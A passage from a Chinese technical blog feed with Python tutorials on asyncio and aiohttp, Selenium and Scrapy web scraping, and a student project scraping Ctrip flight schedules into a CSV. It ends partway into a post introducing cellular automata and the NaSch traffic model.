<h2 id="异步加载-Asyncio"><a href="#异步加载-Asyncio" class="headerlink" title="异步加载 Asyncio"></a>异步加载 Asyncio</h2><p>在单线程里使用异步计算，下载网页的时候和处理网页的时候是不连续的，更有效利用了等待下载的这段时间</p>
<p>以下代码适用于python3.5+</p>
<h3 id="Asyncio示例"><a href="#Asyncio示例" class="headerlink" title="Asyncio示例"></a>Asyncio示例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不是异步的</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(t)</span>:</span></span><br><span class="line">    print(<span class="string">'Start job '</span>, t)</span><br><span class="line">    time.sleep(t)               <span class="comment"># wait for "t" seconds</span></span><br><span class="line">    print(<span class="string">'Job '</span>, t, <span class="string">' takes '</span>, t, <span class="string">' s'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    [job(t) <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t1 = time.time()</span><br><span class="line">main()</span><br><span class="line">print(<span class="string">"NO async total time : "</span>, time.time() - t1)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Start job  1</span></span><br><span class="line"><span class="string">Job  1  takes  1  s</span></span><br><span class="line"><span class="string">Start job  2</span></span><br><span class="line"><span class="string">Job  2  takes  2  s</span></span><br><span class="line"><span class="string">NO async total time :  3.008603096008301</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(t)</span>:</span>                   <span class="comment"># async 形式的功能</span></span><br><span class="line">    print(<span class="string">'Start job '</span>, t)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(t)          <span class="comment"># 等待 "t" 秒, 期间切换其他任务</span></span><br><span class="line">    print(<span class="string">'Job '</span>, t, <span class="string">' takes '</span>, t, <span class="string">' s'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span>                       <span class="comment"># async 形式的功能</span></span><br><span class="line">    tasks = [</span><br><span class="line">    loop.create_task(job(t)) <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">    ]                                       <span class="comment"># 创建任务, 但是不执行</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)               <span class="comment"># 执行并等待所有任务完成</span></span><br><span class="line"></span><br><span class="line">t1 = time.time()</span><br><span class="line">loop = asyncio.get_event_loop()             <span class="comment"># 建立 loop</span></span><br><span class="line">loop.run_until_complete(main(loop))         <span class="comment"># 执行 loop</span></span><br><span class="line">loop.close()                                <span class="comment"># 关闭 loop</span></span><br><span class="line">print(<span class="string">"Async total time : "</span>, time.time() - t1)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Start job  1</span></span><br><span class="line"><span class="string">Start job  2</span></span><br><span class="line"><span class="string">Job  1  takes  1  s</span></span><br><span class="line"><span class="string">Job  2  takes  2  s</span></span><br><span class="line"><span class="string">Async total time :  2.001495838165283</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h3 id="Asyncio爬虫-aiohttp"><a href="#Asyncio爬虫-aiohttp" class="headerlink" title="Asyncio爬虫(aiohttp)"></a>Asyncio爬虫(aiohttp)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">'https://morvanzhou.github.io/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normal</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        r = requests.get(URL)</span><br><span class="line">        url = r.url</span><br><span class="line">        print(url)</span><br><span class="line"></span><br><span class="line">t1 = time.time()</span><br><span class="line">normal()</span><br><span class="line">print(<span class="string">"Normal total time:"</span>, time.time()-t1)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">https://morvanzhou.github.io/</span></span><br><span class="line"><span class="string">https://morvanzhou.github.io/</span></span><br><span class="line"><span class="string">Normal total time: 0.3869960308074951</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line">URL = <span class="string">'https://morvanzhou.github.io/'</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(session)</span>:</span></span><br><span class="line">    response = <span class="keyword">await</span> session.get(URL)       <span class="comment"># 等待拿到url时执行其它程序</span></span><br><span class="line">    <span class="keyword">return</span> str(response.url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:      <span class="comment"># 官网推荐建立 Session 的形式</span></span><br><span class="line">        tasks = [loop.create_task(job(session)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>)] <span class="comment"># 创建任务但不执行</span></span><br><span class="line">        finished, unfinished = <span class="keyword">await</span> asyncio.wait(tasks) <span class="comment"># 执行等到所有任务完成</span></span><br><span class="line">        all_results = [r.result() <span class="keyword">for</span> r <span class="keyword">in</span> finished]    <span class="comment"># 获取所有结果</span></span><br><span class="line">        print(all_results)</span><br><span class="line"></span><br><span class="line">t1 = time.time()</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main(loop))</span><br><span class="line">loop.close()</span><br><span class="line">print(<span class="string">"Async total time:"</span>, time.time() - t1)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">['https://morvanzhou.github.io/', 'https://morvanzhou.github.io/']</span></span><br><span class="line"><span class="string">Async total time: 0.11447715759277344</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h3 id="和多线程的对比"><a href="#和多线程的对比" class="headerlink" title="和多线程的对比"></a>和多线程的对比</h3><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/14/python/%E7%88%AC%E8%99%AB/%E7%88%AC%E8%99%AB%E7%AE%80%E4%BB%8B/4-2-3.png"  alt="å éç¬è«: å¼æ­¥å è½½ Asyncio"></p>
<h1 id="Selenium"><a href="#Selenium" class="headerlink" title="Selenium"></a>Selenium</h1><p>火狐插件 Katalon Recorder可以记录操作日志，并生成对应的python代码</p>
<p>具体操作参考<a href="https://morvanzhou.github.io/tutorials/data-manipulation/scraping/5-01-selenium/#偷懒的火狐浏览器插件" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/data-manipulation/scraping/5-01-selenium/#%E5%81%B7%E6%87%92%E7%9A%84%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6</a></p>
<p>安装浏览器驱动，放到置顶位置（可以参考博客中的《爬取机场数据》）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rom selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()     <span class="comment"># 打开 Chrome 浏览器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将刚刚复制的帖在这</span></span><br><span class="line">driver.get(<span class="string">"https://morvanzhou.github.io/"</span>)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">u"//img[@alt='强化学习 (Reinforcement Learning)']"</span>).click()</span><br><span class="line">driver.find_element_by_link_text(<span class="string">"About"</span>).click()</span><br><span class="line">driver.find_element_by_link_text(<span class="string">u"赞助"</span>).click()</span><br><span class="line">driver.find_element_by_link_text(<span class="string">u"教程 ▾"</span>).click()</span><br><span class="line">driver.find_element_by_link_text(<span class="string">u"数据处理 ▾"</span>).click()</span><br><span class="line">driver.find_element_by_link_text(<span class="string">u"网页爬虫"</span>).click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到网页 html, 还能截图</span></span><br><span class="line">html = driver.page_source       <span class="comment"># get html</span></span><br><span class="line">driver.get_screenshot_as_file(<span class="string">"./img/sreenshot1.png"</span>)</span><br><span class="line">driver.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不弹出浏览器</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">"--headless"</span>)       <span class="comment"># define headless</span></span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(chrome_options=chrome_options)</span><br></pre></td></tr></table></figure>



<p>Senlenium 教学官网：<a href="https://selenium-python.readthedocs.io/" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/</a></p>
<h1 id="Scrapy"><a href="#Scrapy" class="headerlink" title="Scrapy"></a>Scrapy</h1><p>官网：<a href="https://docs.scrapy.org/en/latest/" target="_blank" rel="noopener">https://docs.scrapy.org/en/latest/</a></p>
<p>scrapy学习入门：<a href="https://www.jianshu.com/p/a8aad3bf4dc4" target="_blank" rel="noopener">https://www.jianshu.com/p/a8aad3bf4dc4</a></p>
<p>研究探索：<a href="https://blog.csdn.net/u012150179/article/details/32343635" target="_blank" rel="noopener">https://blog.csdn.net/u012150179/article/details/32343635</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MofanSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">"mofan"</span></span><br><span class="line">    start_urls = [</span><br><span class="line">        <span class="string">'https://morvanzhou.github.io/'</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="comment"># unseen = set()</span></span><br><span class="line">    <span class="comment"># seen = set()      # 我们不在需要 set 了, 它自动去重</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MofanSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> &#123;     <span class="comment"># return some results</span></span><br><span class="line">            <span class="string">'title'</span>: response.css(<span class="string">'h1::text'</span>).extract_first(default=<span class="string">'Missing'</span>).strip().replace(<span class="string">'"'</span>, <span class="string">""</span>),</span><br><span class="line">            <span class="string">'url'</span>: response.url,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        urls = response.css(<span class="string">'a::attr(href)'</span>).re(<span class="string">r'^/.+?/$'</span>)     <span class="comment"># find all sub urls</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">            <span class="keyword">yield</span> response.follow(url, callback=self.parse)     <span class="comment"># it will filter duplication automatically</span></span><br><span class="line">            <span class="comment"># yield 异步处理</span></span><br></pre></td></tr></table></figure>

<p>在terminal中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scrapy runspider 5-2-scrapy.py -o res.json</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>机场到港航班数据爬取</title>
    <url>/2020/07/13/%E5%BB%BA%E6%A8%A1/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="要求描述"><a href="#要求描述" class="headerlink" title="要求描述"></a>要求描述</h1><p>描述国内某机场每天的人流量变化</p>
<h1 id="采取策略"><a href="#采取策略" class="headerlink" title="采取策略"></a>采取策略</h1><h2 id="得到所有航线"><a href="#得到所有航线" class="headerlink" title="得到所有航线"></a>得到所有航线</h2><p>这里我们是选取的城市是深圳，爬取携程的订票系统</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/机场到港航班爬取/image-20200713093306914.png"  alt="image-20200713093306914" style="zoom: 33%;">



<p>我们可以找到一个页面包含了所有到深圳的所有航线<img src="/img/loading.gif" class="lazyload" data-src="/images/机场到港航班爬取/image-20200713093537855.png"  alt="image-20200713093537855" style="zoom: 33%;"></p>
<p>ctrl+U，发现所需要的数据都显示在源码中了，这样我们就可以爬到所有的航线，并输入到一个list中</p>
<p>感谢<a href="https://emanual20.github.io/" target="_blank" rel="noopener">Sakura</a>提供这部分的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flightlinespider.py</span></span><br><span class="line"><span class="comment"># Group: Group bald</span></span><br><span class="line"><span class="comment"># Date: 20200712</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="comment"># 显示所有航线的网页</span></span><br><span class="line">web_url = <span class="string">'https://flights.ctrip.com/schedule/.szx.html'</span></span><br><span class="line">r = requests.get(web_url)</span><br><span class="line">soup = bs4.BeautifulSoup(r.text, <span class="string">"html5lib"</span>)</span><br><span class="line">route_list = []</span><br><span class="line">list1 = soup.find_all(<span class="string">'a'</span>)</span><br><span class="line">list2 = soup.find_all(<span class="string">'a'</span>,&#123;<span class="string">'target'</span>:<span class="string">'_blank'</span>&#125;)</span><br><span class="line">list3 = list(set(list1).difference(set(list2)))</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> list3:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'-深圳'</span> <span class="keyword">in</span> item.text:</span><br><span class="line">        route_list.append(item.text)</span><br><span class="line">route_list.sort()</span><br><span class="line"><span class="comment"># print(route_list)</span></span><br></pre></td></tr></table></figure>



<p>找到包含航班信息的列</p>
<h2 id="得到一条航线的所有航班"><a href="#得到一条航线的所有航班" class="headerlink" title="得到一条航线的所有航班"></a>得到一条航线的所有航班</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/image-20200713094622990.png"  alt="image-20200713094622990"></p>
<p>发现这部分没有直接写在网页源码中，而且尝试利用它payload爬取响应失败</p>
<p>我们需要的信息</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/image-20200713134547601.png"  alt="image-20200713134547601"></p>
<p><font color="green">关于容量我没有找到官方的统计网站，且相同机型的飞机也可能有不同的载客量，所以采取手动查找策略，取大致数值。爬虫只用来爬取前几列</font></p>
<table><tr><td bgcolor="#7FFFD4">使用selenium库模仿真人操作，拿到网页的显示内容</td></tr></table>

<p>具体逻辑已经写在代码注释中</p>
<p>我本人在写这个代码的时候也是第一天接触这个库，里面有的内容有点愚蠢（比如连用七个判断hhh）欢迎大家提出建议</p>
<ul>
<li>环境配置<ul>
<li>安装库</li>
<li>安装浏览器驱动，然后放到 <code>anaconda//Lib/site-packages/selenium/webdriver/chrome/</code>中</li>
</ul>
</li>
<li>大致思路，分别爬取页面中的航班号、机型、班期等信息，每个信息（而不是架航班）存到一个list里，然后将保存了各个信息的list放到一个dataframe里面，写入csv</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Group: Group bald</span></span><br><span class="line"><span class="comment"># Date: 20200712</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> flightlinespider <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTSpider</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, i)</span>:</span></span><br><span class="line">        self.i = <span class="number">0</span></span><br><span class="line">        self.url = <span class="string">'https://flights.ctrip.com/schedule/.szx.html'</span></span><br><span class="line">        self.browser = driver = webdriver.Chrome(</span><br><span class="line">            <span class="string">r'D:/anaconda/new/Lib/site-packages/selenium/webdriver/chrome/chromedriver.exe'</span>)</span><br><span class="line">        self.index = i <span class="comment"># 循环遍历的标记</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 点击特定路线</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.browser.get(self.url) <span class="comment"># 打开url</span></span><br><span class="line">        <span class="comment"># 查找页面中route_list[index]的路线（文字），点击</span></span><br><span class="line">        self.browser.find_elements_by_link_text(route_list[self.index])[<span class="number">0</span>].click()</span><br><span class="line"></span><br><span class="line">        time.sleep(random.uniform(<span class="number">2</span>, <span class="number">4</span>))  <span class="comment"># 给商品页面加载时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析页面</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_html</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="comment"># 查找到当前访问的网页中class="flight_logo"的部分，返回一个列表</span></span><br><span class="line">        flights = self.browser.find_elements_by_class_name(<span class="string">"flight_logo"</span>)</span><br><span class="line">        flightno_list = []</span><br><span class="line">        flight_list = []</span><br><span class="line">        <span class="keyword">for</span> flight <span class="keyword">in</span> flights: <span class="comment"># 循环访问列表中的内容</span></span><br><span class="line">            text = flight.text.split(<span class="string">'/n机型:'</span>) <span class="comment"># 用.text提取出文字内容</span></span><br><span class="line">            flightno_list.append(text[<span class="number">0</span>]) <span class="comment"># 将所需内容添加到列中</span></span><br><span class="line">            flight_list.append(text[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        arv = self.browser.find_elements_by_class_name(<span class="string">"arrive"</span>)</span><br><span class="line">        arrive_time = []  <span class="comment"># 到达时间</span></span><br><span class="line">        arrive_airport = [] <span class="comment"># 到达机场</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> arv:</span><br><span class="line">            a = i.text.split(<span class="string">'/n'</span>) <span class="comment"># 爬取到的内容每条间会有换行</span></span><br><span class="line">            arrive_time.append(a[<span class="number">0</span>])</span><br><span class="line">            arrive_airport.append(a[<span class="number">1</span>])</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># 找到所有的class为week的部分</span></span><br><span class="line">        flights = self.browser.find_elements_by_class_name(<span class="string">"weeks"</span>)</span><br><span class="line">        flights = flights[<span class="number">1</span>:] <span class="comment"># flihts[0]为表头，去除</span></span><br><span class="line">        week_list_mon = []  <span class="comment"># 班期</span></span><br><span class="line">        week_list_tue = []	<span class="comment"># 这段就是非常愚蠢的代码，如果有改良的方法欢迎给我发邮件或者私信我</span></span><br><span class="line">        week_list_wed = []	<span class="comment"># 我不知道怎么生成低维不定长的二维数组</span></span><br><span class="line">        week_list_thu = []</span><br><span class="line">        week_list_fri = []</span><br><span class="line">        week_list_sat = []</span><br><span class="line">        week_list_sun = []</span><br><span class="line">        <span class="comment"># 将数字和星期几对应，方便后续处理</span></span><br><span class="line">        dic = &#123;<span class="number">0</span>: <span class="string">'一'</span>, <span class="number">1</span>: <span class="string">'二'</span>, <span class="number">2</span>: <span class="string">'三'</span>, <span class="number">3</span>: <span class="string">'四'</span>, <span class="number">4</span>: <span class="string">'五'</span>, <span class="number">5</span>: <span class="string">'六'</span>, <span class="number">6</span>: <span class="string">'日'</span>&#125;</span><br><span class="line">        dic_ = &#123;<span class="string">'一'</span>: <span class="number">0</span>, <span class="string">'二'</span>: <span class="number">1</span>, <span class="string">'三'</span>: <span class="number">2</span>, <span class="string">'四'</span>: <span class="number">3</span>, <span class="string">'五'</span>: <span class="number">4</span>, <span class="string">'六'</span>: <span class="number">5</span>, <span class="string">'日'</span>: <span class="number">6</span>&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># 若周一有班次，则"一"的class为"blue",否则为空</span></span><br><span class="line">        <span class="comment"># 在每个块（flight）里继续查找class="blue"即当日有班次的航班</span></span><br><span class="line">        <span class="keyword">for</span> flight <span class="keyword">in</span> flights:</span><br><span class="line">            weeks = flight.find_elements_by_class_name(<span class="string">"blue"</span>)</span><br><span class="line">            weekli = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> weeks: <span class="comment"># 将单个航班中显示为蓝色的星期几的文字调整为列表</span></span><br><span class="line">                weekli.append(i.text)</span><br><span class="line">                <span class="comment"># 例如，如果一三五有班期，则weekli=['一','三','五']</span></span><br><span class="line">            m = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli: <span class="comment"># 如果weekli中包含周一</span></span><br><span class="line">                week_list_mon.append(<span class="number">1</span>) <span class="comment"># 则周一的列表中添加元素1</span></span><br><span class="line">            <span class="keyword">else</span>: <span class="comment"># 否则周一的列表中添加元素0</span></span><br><span class="line">                week_list_mon.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">1</span> <span class="comment"># 周二</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_tue.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_tue.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_wed.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_wed.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_thu.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_thu.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_fri.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_fri.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">5</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_sat.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_sat.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">6</span> <span class="comment"># 周日</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_sun.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_sun.append(<span class="number">0</span>)</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># 准点率</span></span><br><span class="line">        punc = self.browser.find_elements_by_class_name(<span class="string">"punctuality"</span>)</span><br><span class="line">        punc_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> punc:</span><br><span class="line">            <span class="keyword">if</span> i.text != <span class="string">'准点率'</span>:</span><br><span class="line">                punc_list.append(i.text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将数据放到一个database里面</span></span><br><span class="line">        data = &#123;<span class="string">'航班号'</span>:flightno_list,<span class="string">'机型'</span>: flight_list, <span class="string">'到达时间'</span>: arrive_time,</span><br><span class="line">                <span class="string">'到达机场'</span>: arrive_airport,<span class="string">'周一'</span>: week_list_mon, <span class="string">'周二'</span>: week_list_tue,</span><br><span class="line">                <span class="string">'周三'</span>: week_list_wed, <span class="string">'周四'</span>: week_list_thu, <span class="string">'周五'</span>: week_list_fri,</span><br><span class="line">                <span class="string">'周六'</span>: week_list_sat, <span class="string">'周日'</span>: week_list_sun, <span class="string">'准点率'</span>: punc_list&#125;</span><br><span class="line">        df = pd.DataFrame(data)</span><br><span class="line">		df=df.drop_duplicates() <span class="comment"># 去除由于“经停”带来的重复数据</span></span><br><span class="line">        df.to_csv(<span class="string">'Data3.csv'</span>, mode=<span class="string">'a'</span>, header=<span class="literal">False</span>) <span class="comment"># 以追加方式写入文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 主函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_html()</span><br><span class="line">        self.parse_html()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">global</span> route_list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(route_list)):</span><br><span class="line">        print(i, route_list[i]) <span class="comment"># 打印进度，如果中间出现问题，调整后可以从出错处继续运行</span></span><br><span class="line">        spider = CTSpider(i)</span><br><span class="line">        spider.main()</span><br></pre></td></tr></table></figure>

<p>拿到了数据</p>
<p>太难了</p>
<hr>
<p>今日感悟</p>
<p>要么爬，要么爬</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/%E7%88%AC.gif"  alt="爬"></p>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>动态网页爬取</tag>
        <tag>建模</tag>
        <tag>数据采集</tag>
      </tags>
  </entry>
  <entry>
    <title>元胞自动机</title>
    <url>/2020/07/10/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>内容来自：</p>
<p><a href="https://www.zhihu.com/question/21929655" target="_blank" rel="noopener">https://www.zhihu.com/question/21929655</a></p>
</blockquote>
<h1 id="演化规则（二维）"><a href="#演化规则（二维）" class="headerlink" title="演化规则（二维）"></a>演化规则（二维）</h1><ol>
<li><p>活细胞周围的细胞数小于2个或多于3个则死亡；</p>
</li>
<li><p>活细胞周围有2或3个细胞可以继续存活；</p>
</li>
<li><p>死细胞周围恰好有3个细胞则会复活。</p>
</li>
</ol>
<h1 id="在交通领域的应用"><a href="#在交通领域的应用" class="headerlink" title="在交通领域的应用"></a>在交通领域的应用</h1><ul>
<li>经典的NaSch模型，模拟了车辆在一维高速公路上的行驶状态</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-b2257119ede75ba235cbd938d0736004_hd-1594375032129.gif"  alt="v2-b2257119ede75ba235cbd938d0736004_hd"></p>
<ul>
<li>将CA模型推广到二维，可以仿真换道的行人流或车流</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-8f6ba0eead51c46ed921d33884c1cbf6_hd.webp"  alt="v2-8f6ba0eead51c46ed921d33884c1cbf6_hd"></p>
<ul>
<li>通过设置更复杂的规则，可以用元胞自动机仿真更真实的情况。例如在对向行走的行人流情境下，元胞们会仿真行人的排队特性，从而避免冲突相撞。<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-332188684ca16eb388779eb1af2789a9_hd.gif"  alt="v2-332188684ca16eb388779eb1af2789a9_hd"></li>
</ul>
<h2 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h2><p>NaSch模型</p>
<ul>
<li>老规矩，先调包，并创建一个图像</li>
</ul>
